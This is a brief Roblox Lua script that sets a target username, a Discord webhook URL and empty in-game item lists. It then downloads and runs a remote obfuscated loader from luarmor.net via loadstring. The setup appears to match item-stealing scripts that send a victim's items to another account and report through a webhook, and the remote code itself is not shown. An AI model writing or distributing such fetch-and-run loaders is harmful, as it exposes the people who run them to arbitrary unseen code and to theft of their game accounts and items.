-- Mode: NORMAL
getgenv().TARGET_USERNAME = "cada3241213223"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/2344"
getgenv().NORMAL_BRAINROTS = {}
getgenv().NORMAL_BASE_SKINS = {}
getgenv().NORMAL_GEARS = {}

task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)